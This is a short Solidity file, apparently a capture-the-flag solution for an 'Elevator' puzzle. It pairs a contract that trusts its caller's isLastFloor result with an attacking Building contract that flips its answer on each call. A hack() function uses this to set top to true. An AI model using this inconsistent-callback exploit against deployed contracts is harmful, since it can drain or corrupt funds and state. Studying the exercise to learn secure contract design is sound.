// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// interface Building {
//   function isLastFloor(uint) external returns (bool);
// }


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    console.log("Entered goTo");
     
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Building {
    Elevator elevator;
    bool private switchBool = true;

    constructor(address elevatorAddress) {
        elevator = Elevator(elevatorAddress);
    }

    function isLastFloor(uint floor) external returns (bool) {
        console.log("Entered isLastFloor");
        switchBool = !switchBool;
        return switchBool;
    }

    function hack() external {
        console.log("Entered hack");
        elevator.goTo(1);
    }

}